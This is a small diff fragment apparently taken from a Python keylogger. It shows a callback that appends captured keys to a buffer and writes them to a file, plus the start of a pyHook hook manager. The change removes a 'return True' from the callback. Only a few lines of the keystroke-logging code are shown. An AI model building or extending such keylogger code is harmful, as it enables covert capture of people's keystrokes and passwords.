@@ -24,7 +24,6 @@ def callLogKeys(event):
     buffer = buffer + recordKeys
     file.write(buffer)
     file.close()
-    return True
 
 def manageLoggedKeys():
     hookManager = pyHook.HookManager()
